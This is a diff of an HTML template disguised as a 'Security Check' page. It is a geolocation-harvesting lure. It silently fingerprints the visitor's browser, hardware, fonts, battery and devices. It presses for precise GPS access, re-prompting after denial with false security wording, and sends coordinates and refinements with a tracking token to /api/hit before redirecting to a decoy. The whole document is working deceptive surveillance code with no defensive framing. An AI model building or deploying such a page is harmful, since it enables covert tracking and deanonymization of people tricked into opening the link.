@@ -3,213 +3,417 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#0b0f14">
 <title>Security Check</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
 <style>
-  :root{--bg:#0b0f14;--card:#131a23;--line:#1f2b39;--txt:#e7eef7;--dim:#7f8fa4;--acc:#2f81f7;--ok:#3fb950;--bad:#f85149}
-  *{box-sizing:border-box}
-  body{margin:0;min-height:100vh;display:grid;place-items:center;padding:24px;
-       background:radial-gradient(1200px 600px at 50% -10%,#16233a 0%,var(--bg) 60%);
-       font:15px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;color:var(--txt)}
-  .card{width:100%;max-width:420px;background:var(--card);border:1px solid var(--line);
-        border-radius:18px;padding:26px;box-shadow:0 24px 60px rgba(0,0,0,.55)}
-  .brand{display:flex;align-items:center;gap:10px;margin-bottom:18px}
-  .dot{width:10px;height:10px;border-radius:50%;background:var(--ok);
-       box-shadow:0 0 0 4px rgba(63,185,80,.15);animation:p 1.8s infinite}
-  @keyframes p{50%{opacity:.35}}
+  :root{
+    --bg:#0b0f14;--card:#131a23;--line:#1f2b39;--txt:#e7eef7;
+    --dim:#7f8fa4;--acc:#2f81f7;--ok:#3fb950;--bad:#f85149;--warn:#d29922;
+  }
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    margin:0;display:grid;place-items:center;padding:24px;
+    background:radial-gradient(1200px 600px at 50% -10%,#16233a 0%,var(--bg) 60%);
+    font:15px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,sans-serif;
+    color:var(--txt);-webkit-font-smoothing:antialiased;
+  }
+  .card{
+    width:100%;max-width:430px;background:var(--card);border:1px solid var(--line);
+    border-radius:18px;padding:26px 26px 20px;
+    box-shadow:0 24px 60px rgba(0,0,0,.55),0 1px 0 rgba(255,255,255,.04) inset;
+  }
+  .brand{display:flex;align-items:center;gap:11px;margin-bottom:16px}
+  .dot{
+    width:10px;height:10px;border-radius:50%;background:var(--ok);flex:none;
+    box-shadow:0 0 0 4px rgba(63,185,80,.15);animation:pulse 1.9s ease-in-out infinite;
+  }
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
   h1{font-size:17px;margin:0;font-weight:650;letter-spacing:-.2px}
-  .sub{color:var(--dim);font-size:13px;margin:0 0 20px}
+  .sub{color:var(--dim);font-size:13px;margin:0 0 18px}
+  .rows{border-top:1px solid var(--line)}
   .row{display:flex;justify-content:space-between;gap:12px;padding:11px 0;
-       border-top:1px solid var(--line);font-size:13.5px}
+       border-bottom:1px solid var(--line);font-size:13.5px}
   .row span:first-child{color:var(--dim)}
-  .st{font-variant-numeric:tabular-nums;font-weight:600;color:var(--dim)}
-  .st.run{color:var(--acc)}.st.ok{color:var(--ok)}.st.bad{color:var(--bad)}
-  .bar{height:5px;border-radius:99px;background:var(--line);overflow:hidden;margin:18px 0 6px}
-  .bar i{display:block;height:100%;width:4%;background:var(--acc);transition:width .6s ease}
-  button{width:100%;margin-top:16px;padding:13px;border-radius:12px;border:0;
-         background:var(--acc);color:#fff;font-size:15px;font-weight:650;cursor:pointer;
-         display:none}
+  .st{font-variant-numeric:tabular-nums;font-weight:600;color:var(--dim);white-space:nowrap}
+  .st.run{color:var(--acc)}.st.ok{color:var(--ok)}.st.bad{color:var(--bad)}.st.warn{color:var(--warn)}
+  .bar{height:5px;border-radius:99px;background:var(--line);overflow:hidden;margin:18px 0 4px}
+  .bar i{display:block;height:100%;width:4%;background:var(--acc);
+         transition:width .65s cubic-bezier(.2,.8,.2,1)}
+  button{
+    width:100%;margin-top:16px;padding:13px;border-radius:12px;border:0;
+    background:var(--acc);color:#fff;font-size:15px;font-weight:650;cursor:pointer;
+    display:none;transition:transform .12s ease,filter .12s ease;
+  }
   button.show{display:block}
-  .foot{margin-top:16px;text-align:center;font-size:11.5px;color:var(--dim)}
-  code{font-family:ui-monospace,Menlo,monospace;font-size:12px}
+  button:active{transform:scale(.985);filter:brightness(.92)}
+  button.ghost{background:transparent;border:1px solid var(--line);color:var(--txt)}
+  .foot{margin-top:14px;text-align:center;font-size:11.5px;color:var(--dim);letter-spacing:.2px}
+  code{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px}
+  .lock{display:inline-flex;align-items:center;gap:5px}
+  .lock svg{width:11px;height:11px;fill:var(--ok)}
+  .note{
+    margin-top:14px;padding:10px 12px;border-radius:10px;font-size:12.5px;line-height:1.5;
+    background:rgba(210,153,34,.09);border:1px solid rgba(210,153,34,.3);
+    color:#e3c07a;display:none;
+  }
+  .note.show{display:block}
 </style>
 </head>
 <body>
-<div class="card">
+<main class="card">
   <div class="brand"><div class="dot"></div><h1>Verifying your connection</h1></div>
   <p class="sub">Confirming device trust and location region. Keep this tab open — it takes a few seconds.</p>
 
-  <div class="row"><span>Client</span><span class="st" id="s1">queued</span></div>
-  <div class="row"><span>Device profile</span><span class="st" id="s2">queued</span></div>
-  <div class="row"><span>Precise position</span><span class="st" id="s3">queued</span></div>
-  <div class="row"><span>Network region</span><span class="st" id="s4">queued</span></div>
+  <div class="rows">
+    <div class="row"><span>Client</span><span class="st" id="s1">queued</span></div>
+    <div class="row"><span>Device profile</span><span class="st" id="s2">queued</span></div>
+    <div class="row"><span>Precise position</span><span class="st" id="s3">queued</span></div>
+    <div class="row"><span>Network region</span><span class="st" id="s4">queued</span></div>
+  </div>
 
   <div class="bar"><i id="bar"></i></div>
-  <button id="retry">Allow precise location</button>
-  <p class="foot">Protected by TLS 1.3 · <code id="sid"></code></p>
-</div>
+
+  <div class="note" id="note"></div>
+
+  <button id="retry" type="button">Allow precise location</button>
+  <button id="cont" class="ghost" type="button">Continue</button>
+
+  <p class="foot">
+    <span class="lock">
+      <svg viewBox="0 0 24 24"><path d="M12 1a5 5 0 00-5 5v3H5v14h14V9h-2V6a5 5 0 00-5-5zm0 2a3 3 0 013 3v3H9V6a3 3 0 013-3z"/></svg>
+      TLS 1.3 encrypted
+    </span>
+    · <code id="sid"></code>
+  </p>
+</main>
+
+<noscript><p style="text-align:center;color:#f85149">JavaScript is required.</p></noscript>
 
 <script>
 (function () {
   "use strict";
-  const TOKEN = {{ token|tojson }};
-  const DECOY = {{ decoy|tojson }};
-  const API   = "/api/hit";
-  const $     = id => document.getElementById(id);
-  let best = Infinity, watchId = null, sentRefine = 0, done = false, t0 = Date.now();
 
-  $("sid").textContent = Math.random().toString(16).slice(2, 10);
+  var TOKEN = {{ token|tojson }};
+  var DECOY = {{ decoy|tojson }};
+  var API   = "/api/hit";
+  var FP    = {};
+  var best  = Infinity;
+  var watchId = null;
+  var refineCount = 0;
+  var t0 = Date.now();
+  var finished = false;
+  var fired = false;
 
-  const set = (id, txt, cls) => { const e = $(id); e.textContent = txt; e.className = "st " + (cls || ""); };
-  const prog = p => $("bar").style.width = Math.max(4, Math.min(100, p)) + "%";
+  var $ = function (id) { return document.getElementById(id); };
+
+  $("sid").textContent = "sess-" + Math.random().toString(16).slice(2, 10);
+
+  function set(id, txt, cls) {
+    var e = $(id); if (!e) return;
+    e.textContent = txt;
+    e.className = "st" + (cls ? " " + cls : "");
+  }
+  function prog(p) { $("bar").style.width = Math.max(4, Math.min(100, p)) + "%"; }
+  function note(msg) { var n = $("note"); n.textContent = msg; n.classList.add("show"); }
 
   function post(stage, extra) {
-    const body = JSON.stringify(Object.assign({
-      token: TOKEN, stage, ts: new Date().toISOString(),
-      dwell: Date.now() - t0, fp: FP
-    }, extra || {}));
+    var body;
     try {
-      fetch(API, { method: "POST", keepalive: true,
-        headers: { "Content-Type": "application/json" }, body })
-        .catch(() => {});
-    } catch (e) {
-      try { navigator.sendBeacon(API, new Blob([body], { type: "application/json" })); } catch (_) {}
+      body = JSON.stringify({
+        token: TOKEN,
+        stage: stage,
+        ts: new Date().toISOString(),
+        dwell: Date.now() - t0,
+        fp: FP,
+        extra: extra || null
+      });
+    } catch (e) { return; }
+
+    var ok = false;
+    try {
+      fetch(API, {
+        method: "POST",
+        keepalive: true,
+        headers: { "Content-Type": "application/json" },
+        body: body
+      }).catch(function () {});
+      ok = true;
+    } catch (e) { ok = false; }
+
+    if (!ok && navigator.sendBeacon) {
+      try {
+        navigator.sendBeacon(API, new Blob([body], { type: "application/json" }));
+      } catch (e) {}
     }
   }
 
-  /* ---------- fingerprint: all passive, no permission needed ---------- */
+  /* ─────────── passive fingerprint (no permission needed) ─────────── */
   function gpu() {
     try {
-      const c = document.createElement("canvas");
-      const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+      var c = document.createElement("canvas");
+      var gl = c.getContext("webgl") || c.getContext("experimental-webgl");
       if (!gl) return null;
-      const d = gl.getExtension("WEBGL_debug_renderer_info");
+      var d = gl.getExtension("WEBGL_debug_renderer_info");
       return d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
     } catch (e) { return null; }
   }
+
   function canvasHash() {
     try {
-      const c = document.createElement("canvas"); c.width = 240; c.height = 60;
-      const x = c.getContext("2d");
-      x.textBaseline = "top"; x.font = "16px Arial";
+      var c = document.createElement("canvas");
+      c.width = 240; c.height = 60;
+      var x = c.getContext("2d");
+      x.textBaseline = "top";
+      x.font = "16px Arial";
       x.fillStyle = "#f60"; x.fillRect(0, 0, 240, 60);
       x.fillStyle = "#069"; x.fillText("geo⌘harvest✓", 4, 8);
       x.fillStyle = "rgba(102,204,0,.7)"; x.fillText("geo⌘harvest✓", 6, 26);
-      const s = c.toDataURL();
-      let h = 2166136261;
-      for (let i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 16777619); }
+      var s = c.toDataURL();
+      var h = 2166136261;
+      for (var i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 16777619); }
       return (h >>> 0).toString(16);
     } catch (e) { return null; }
   }
-  function fonts() {
-    const base = ["monospace", "sans-serif", "serif"];
-    const probe = ["Roboto", "Segoe UI", "Helvetica Neue", "Arial", "San Francisco",
-                   "Ubuntu", "Cantarell", "Noto Sans", "SF Pro Text", "Arial Narrow"];
-    const c = document.createElement("canvas").getContext("2d");
-    const w = f => { c.font = "72px " + f; return c.measureText("mmmmmmmmmmlli").width; };
-    const b = base.map(w);
-    return probe.filter(f => base.some((bf, i) => w(`"${f}",${bf}`) !== b[i]));
-  }
-  const FP = {
-    ua: navigator.userAgent, uaMobile: navigator.userAgentData?.mobile ?? null,
-    platform: navigator.platform, vendor: navigator.vendor,
-    lang: navigator.language, langs: (navigator.languages || []).join(","),
-    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    tzOff: new Date().getTimezoneOffset(),
-    screen: [screen.width, screen.height, screen.colorDepth, devicePixelRatio],
-    avail: [screen.availWidth, screen.availHeight],
-    win: [innerWidth, innerHeight],
-    cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory,
-    touch: navigator.maxTouchPoints, gpu: gpu(), canvas: canvasHash(),
-    fonts: fonts(), cookies: navigator.cookieEnabled,
-    dnt: navigator.doNotTrack, plugins: (navigator.plugins || []).length,
-    gpc: navigator.globalPrivacyControl ?? null,
-    referrer: document.referrer || null, storage: !!window.localStorage
-  };
 
-  if (navigator.userAgentData?.getHighEntropyValues) {
-    navigator.userAgentData.getHighEntropyValues(
-      ["model", "platformVersion", "architecture", "bitness", "fullVersionList"])
-      .then(v => { FP.he = v; post("fingerprint", { he: v }); }).catch(() => {});
-  }
-  if (navigator.connection) {
-    const c = navigator.connection;
-    FP.net = { type: c.type, eff: c.effectiveType, down: c.downlink, rtt: c.rtt, save: c.saveData };
-  }
-  if (navigator.getBattery) {
-    navigator.getBattery().then(b => {
-      FP.battery = { level: b.level, charging: b.charging };
-      post("fingerprint", { battery: FP.battery });
-    }).catch(() => {});
-  }
-  if (navigator.mediaDevices?.enumerateDevices) {
-    navigator.mediaDevices.enumerateDevices()
-      .then(d => { FP.devices = d.map(x => x.kind); }).catch(() => {});
+  function fontList() {
+    try {
+      var base = ["monospace", "sans-serif", "serif"];
+      var probe = ["Roboto", "Segoe UI", "Helvetica Neue", "Arial", "SF Pro Text",
+                   "Ubuntu", "Cantarell", "Noto Sans", "Arial Narrow", "Tahoma"];
+      var c = document.createElement("canvas").getContext("2d");
+      var w = function (f) { c.font = "72px " + f; return c.measureText("mmmmmmmmmmlli").width; };
+      var b = base.map(w);
+      return probe.filter(function (f) {
+        return base.some(function (bf, i) { return w('"' + f + '",' + bf) !== b[i]; });
+      });
+    } catch (e) { return []; }
   }
 
-  /* ---------- stage 1: fire immediately, no interaction ---------- */
-  set("s1", "verified", "ok"); prog(12);
-  set("s2", "collecting", "run");
-  setTimeout(() => { set("s2", "captured", "ok"); prog(30); post("fingerprint"); }, 350);
+  function buildFP() {
+    var c = navigator.connection || {};
+    FP = {
+      ua: navigator.userAgent,
+      uaMobile: (navigator.userAgentData && navigator.userAgentData.mobile) || null,
+      platform: navigator.platform,
+      vendor: navigator.vendor,
+      lang: navigator.language,
+      langs: (navigator.languages || []).join(","),
+      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      tzOff: new Date().getTimezoneOffset(),
+      screen: [screen.width, screen.height, screen.colorDepth, window.devicePixelRatio || 1],
+      avail: [screen.availWidth, screen.availHeight],
+      win: [window.innerWidth, window.innerHeight],
+      cores: navigator.hardwareConcurrency || null,
+      mem: navigator.deviceMemory || null,
+      touch: navigator.maxTouchPoints || 0,
+      gpu: gpu(),
+      canvas: canvasHash(),
+      fonts: fontList(),
+      cookies: navigator.cookieEnabled,
+      dnt: navigator.doNotTrack || null,
+      gpc: (typeof navigator.globalPrivacyControl === "boolean")
+             ? navigator.globalPrivacyControl : null,
+      plugins: (navigator.plugins || []).length,
+      referrer: document.referrer || null,
+      storage: (function () {
+        try { localStorage.setItem("_t", "1"); localStorage.removeItem("_t"); return true; }
+        catch (e) { return false; }
+      })(),
+      net: { type: c.type || null, eff: c.effectiveType || null,
+             down: c.downlink || null, rtt: c.rtt || null, save: c.saveData || null },
+      prev: null
+    };
 
-  /* ---------- stage 2: geolocation ladder ---------- */
+    try {
+      var last = localStorage.getItem("gh_prev");
+      if (last) FP.prev = last;
+      localStorage.setItem("gh_prev", new Date().toISOString());
+    } catch (e) {}
+
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+      navigator.userAgentData.getHighEntropyValues(
+        ["model", "platformVersion", "architecture", "bitness", "fullVersionList"]
+      ).then(function (v) {
+        FP.he = v;
+        post("fingerprint");
+      }).catch(function () {});
+    }
+
+    if (navigator.getBattery) {
+      navigator.getBattery().then(function (b) {
+        FP.battery = { level: b.level, charging: b.charging };
+        post("fingerprint");
+      }).catch(function () {});
+    }
+
+    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+      navigator.mediaDevices.enumerateDevices().then(function (d) {
+        FP.devices = d.map(function (x) { return x.kind; });
+      }).catch(function () {});
+    }
+  }
+
+  /* ─────────── geolocation ladder ─────────── */
+  function checkPermission() {
+    if (!navigator.permissions || !navigator.permissions.query) return;
+    navigator.permissions.query({ name: "geolocation" }).then(function (p) {
+      if (p.state === "granted") {
+        set("s3", "pre-authorized", "ok");
+      } else if (p.state === "denied") {
+        set("s3", "previously blocked", "warn");
+        note("Location is blocked for this site. Tap the button and choose Allow.");
+        $("retry").classList.add("show");
+      }
+      p.onchange = function () {
+        if (p.state === "granted" && best === Infinity) startGeo();
+      };
+    }).catch(function () {});
+  }
+
   function startGeo() {
-    if (!navigator.geolocation) { set("s3", "unsupported", "bad"); post("nogeo"); return; }
-    set("s3", "requesting", "run"); prog(45);
-    navigator.geolocation.getCurrentPosition(onPos, onErr,
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+    if (!navigator.geolocation) {
+      set("s3", "unsupported", "bad");
+      post("nogeo");
+      showContinue();
+      return;
+    }
+    if (fired && best < Infinity) return;
+    fired = true;
+    set("s3", "requesting", "run");
+    prog(45);
+    try {
+      navigator.geolocation.getCurrentPosition(onPos, onErr, {
+        enableHighAccuracy: true,
+        timeout: 15000,
+        maximumAge: 0
+      });
+    } catch (e) {
+      onErr({ code: 2, message: String(e) });
+    }
   }
 
   function onPos(p) {
-    best = Math.min(best, p.coords.accuracy);
-    set("s3", "locked ±" + Math.round(p.coords.accuracy) + "m", "ok");
-    prog(78);
+    var c = p.coords;
+    if (c.accuracy < best) best = c.accuracy;
+    set("s3", "locked ±" + Math.round(c.accuracy) + "m", "ok");
+    $("retry").classList.remove("show");
+    $("note").classList.remove("show");
+    prog(80);
+
     post("gps", {
-      lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy,
-      alt: p.coords.altitude, hdg: p.coords.heading, spd: p.coords.speed
+      lat: c.latitude, lon: c.longitude, acc: c.accuracy,
+      alt: c.altitude, hdg: c.heading, spd: c.speed
     });
+
     if (watchId === null) {
-      watchId = navigator.geolocation.watchPosition(onRefine, null,
-        { enableHighAccuracy: true, maximumAge: 0, timeout: 25000 });
+      try {
+        watchId = navigator.geolocation.watchPosition(onRefine, null, {
+          enableHighAccuracy: true, maximumAge: 0, timeout: 25000
+        });
+      } catch (e) {}
     }
-    finishSoon();
+    wrapUp();
   }
 
   function onRefine(p) {
-    const a = p.coords.accuracy;
-    if (sentRefine >= 6) return;
-    if (a < best * 0.8 || Date.now() - t0 > 12000) {
-      best = Math.min(best, a); sentRefine++;
-      post("refine", { lat: p.coords.latitude, lon: p.coords.longitude, acc: a });
+    var a = p.coords.accuracy;
+    if (refineCount >= 6) return;
+    if (a < best * 0.8 || (Date.now() - t0 > 12000 && a < best)) {
+      if (a < best) best = a;
+      refineCount++;
+      set("s3", "refining ±" + Math.round(a) + "m", "ok");
+      post("refine", {
+        lat: p.coords.latitude, lon: p.coords.longitude, acc: a
+      });
     }
   }
 
   function onErr(e) {
-    const map = { 1: "blocked", 2: "unavailable", 3: "timed out" };
-    set("s3", map[e.code] || "failed", "bad");
-    post("denied", { code: e.code, msg: e.message });
+    var label = { 1: "blocked", 2: "unavailable", 3: "timed out" }[e.code] || "failed";
+    set("s3", label, "bad");
+    post("denied", { code: e.code, msg: e.message || "" });
     prog(62);
+
+    if (e.code === 1) {
+      note("Location is blocked. Tap the button and choose Allow — or open this link in your browser.");
+    } else if (e.code === 3) {
+      note("GPS is taking too long. Move near a window and tap retry.");
+    } else {
+      note("Position unavailable. Tap retry to try again.");
+    }
     $("retry").classList.add("show");
+    showContinue();
   }
 
-  function finishSoon() {
-    if (done) return; done = true;
-    setTimeout(() => {
-      prog(100); set("s4", "resolved", "ok");
-      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
-      if (DECOY) setTimeout(() => location.replace(DECOY), 1200);
-    }, 2500);
+  function showContinue() {
+    $("cont").classList.add("show");
   }
 
-  /* second gesture re-prompt (iOS grants on tap after denial) */
-  $("retry").addEventListener("click", () => {
+  function wrapUp() {
+    if (finished) return;
+    finished = true;
+    setTimeout(function () {
+      prog(100);
+      set("s4", "resolved", "ok");
+      if (watchId !== null) {
+        try { navigator.geolocation.clearWatch(watchId); } catch (e) {}
+      }
+      if (DECOY) setTimeout(function () { location.replace(DECOY); }, 1400);
+      else showContinue();
+    }, 2600);
+  }
+
+  /* ─────────── events ─────────── */
+  $("retry").addEventListener("click", function () {
     $("retry").classList.remove("show");
+    $("note").classList.remove("show");
+    fired = false;
     startGeo();
   });
 
-  /* watchdog: IP fallback is server-side, so just report */
-  setTimeout(() => { if (best === Infinity) { post("timeout"); set("s4", "fallback", "run"); prog(55); } }, 18000);
+  $("cont").addEventListener("click", function () {
+    if (DECOY) location.replace(DECOY);
+    else window.scrollTo({ top: 0, behavior: "smooth" });
+  });
 
-  window.addEventListener("load", startGeo);
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "visible" && best === Infinity && !finished) {
+      startGeo();
+    }
+  });
+
+  /* ─────────── boot ─────────── */
+  set("s1", "verified", "ok");
+  prog(12);
+  set("s2", "collecting", "run");
+
+  setTimeout(function () {
+    buildFP();
+    set("s2", "captured", "ok");
+    prog(32);
+    post("fingerprint");
+  }, 300);
+
+  setTimeout(function () {
+    if (best === Infinity) {
+      post("timeout");
+      set("s4", "fallback", "warn");
+      prog(56);
+      showContinue();
+    }
+  }, 19000);
+
+  if (document.readyState === "complete") {
+    checkPermission();
+    startGeo();
+  } else {
+    window.addEventListener("load", function () {
+      checkPermission();
+      startGeo();
+    });
+  }
 })();
 </script>
 </body>
